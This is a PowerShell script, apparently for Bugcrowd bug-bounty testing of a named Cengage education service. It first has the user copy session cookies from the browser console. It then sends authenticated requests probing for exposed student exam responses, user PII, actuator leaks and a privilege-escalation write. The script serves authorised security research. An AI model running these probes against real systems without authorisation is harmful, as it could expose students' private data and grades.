##############################################################
# CENGAGE — GET FULL COOKIES FROM BROWSER CONSOLE
# Run this in DevTools Console tab on starship-emulator.cengage.com
##############################################################

# PASTE THIS IN YOUR BROWSER CONSOLE (F12 → Console tab):
# ---------------------------------------------------------
# Copy ALL cookie values at once:
# document.cookie

# OR get them one by one (more readable):
# document.cookie.split(';').forEach(c => console.log(c.trim()))

# OR copy them as JSON for easy pasting:
# JSON.stringify(Object.fromEntries(document.cookie.split(';').map(c=>c.trim().split('='))))

##############################################################
# WHAT TO LOOK FOR IN THE OUTPUT:
##############################################################
# 
# You should see something like:
# STARSHIPEMULATOR_SESSION=ZDAzOTE4M2ItO...  ← THIS IS THE KEY ONE
# XSRF-TOKEN=e9ff20bc-9ed4-4d...              ← ALSO NEEDED
#
# Paste the FULL values here and run this script:
##############################################################

# ← REPLACE THESE WITH YOUR ACTUAL VALUES FROM CONSOLE OUTPUT →
$STARSHIP_SESSION = "ZDAzOTE4M2ItO_FULL_VALUE_HERE"
$XSRF_TOKEN       = "e9ff20bc-9ed4-4d_FULL_VALUE_HERE"

$BASE = "https://starship-emulator.cengage.com"
$cookieStr = "STARSHIPEMULATOR_SESSION=$STARSHIP_SESSION; XSRF-TOKEN=$XSRF_TOKEN"

$h = @{
    "Content-Type"               = "application/json"
    "Accept"                     = "application/json"
    "X-Vulnerability-Disclosure" = "saifullahsayyed5eb868@bugcrowdninja.com"
    "Cookie"                     = $cookieStr
    "X-XSRF-TOKEN"              = $XSRF_TOKEN
    "Referer"                    = "https://starship-emulator.cengage.com/"
    "Origin"                     = "https://starship-emulator.cengage.com"
}

function Invoke-Test($method, $path, $body=$null) {
    Write-Host "`n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkCyan
    Write-Host " [$method] $path" -ForegroundColor Cyan
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkCyan
    $p = @{ Uri="$BASE$path"; Method=$method; Headers=$h; UseBasicParsing=$true; ErrorAction="Stop" }
    if($body) { $p.Body = $body }
    try {
        $r = Invoke-WebRequest @p
        Write-Host " ✅ STATUS: $($r.StatusCode)" -ForegroundColor Green
        try { $r.Content | ConvertFrom-Json | ConvertTo-Json -Depth 6 }
        catch { Write-Host $r.Content.Substring(0,[Math]::Min(800,$r.Content.Length)) }
    } catch {
        $code = $_.Exception.Response.StatusCode.value__
        Write-Host " ❌ STATUS: $code" -ForegroundColor Red
        try {
            $s = $_.Exception.Response.GetResponseStream()
            $rb = (New-Object System.IO.StreamReader($s)).ReadToEnd()
            Write-Host $rb.Substring(0,[Math]::Min(500,$rb.Length)) -ForegroundColor Red
        } catch {}
    }
    Start-Sleep -Seconds 3  # ← Rate limit: max 20 req/min
}

Write-Host "`n🔐 STARSHIP-EMULATOR AUTHENTICATED SECURITY SCAN" -ForegroundColor Magenta
Write-Host "   User: saifullahsayyed5eb868@bugcrowdninja.com" -ForegroundColor Gray
Write-Host ""

# TEST 1: userProfile — What data does it return when authenticated?
Write-Host "TEST 1: USER PROFILE (authenticated)" -ForegroundColor Yellow
Invoke-Test "GET" "/api/userProfile"

# TEST 2: uiSettings — Internal configuration
Write-Host "`nTEST 2: UI SETTINGS" -ForegroundColor Yellow
Invoke-Test "GET" "/api/uiSettings"

# TEST 3: LRNO Proxy — GET itembank/activities (Learnosity data access)
Write-Host "`nTEST 3: LRNO PROXY — GET itembank/activities" -ForegroundColor Yellow
Invoke-Test "POST" "/api/service/execute-lrno-data-api-request" `
    -body '{"action":"get","endpoint":"/itembank/activities","request":{"limit":5}}'

# TEST 4: LRNO Proxy — GET sessions/responses (student exam answers!)
Write-Host "`nTEST 4: LRNO PROXY — GET sessions/responses (IDOR!)" -ForegroundColor Yellow
Invoke-Test "POST" "/api/service/execute-lrno-data-api-request" `
    -body '{"action":"get","endpoint":"/sessions/responses","request":{"limit":5}}'

# TEST 5: LRNO Proxy — GET users (PII exposure)
Write-Host "`nTEST 5: LRNO PROXY — GET users" -ForegroundColor Yellow
Invoke-Test "POST" "/api/service/execute-lrno-data-api-request" `
    -body '{"action":"get","endpoint":"/users/users","request":{"limit":5}}'

# TEST 6: Retrieve Session Responses (direct)
Write-Host "`nTEST 6: RETRIEVE SESSION RESPONSES (direct)" -ForegroundColor Yellow
Invoke-Test "GET" "/api/retrieveSessionResponses"

# TEST 7: Actuator version + commithash (now with auth)
Write-Host "`nTEST 7: ACTUATOR VERSION + COMMITHASH" -ForegroundColor Yellow
Invoke-Test "GET" "/actuator/version"
Invoke-Test "GET" "/actuator/commithash"

# TEST 8: Internal tags — Student accessing instructor-only endpoint
Write-Host "`nTEST 8: INTERNAL ACTIVITY TAGS (privilege escalation test)" -ForegroundColor Yellow
Invoke-Test "POST" "/api/service/internal/activity-tags/update" `
    -body '{"entityId":"test-security-check","tags":["pentest"]}'

Write-Host "`n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkCyan
Write-Host " ✅ SCAN COMPLETE — Copy results for Bugcrowd reports" -ForegroundColor Green
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`n" -ForegroundColor DarkCyan
